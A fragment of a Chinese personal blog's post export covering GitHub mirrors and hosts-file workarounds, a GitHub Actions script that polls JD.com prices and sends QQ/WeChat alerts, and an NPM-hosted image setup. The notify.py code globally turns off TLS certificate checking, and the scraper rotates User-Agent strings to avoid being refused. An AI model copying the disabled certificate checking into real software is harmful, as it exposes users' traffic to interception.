title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span 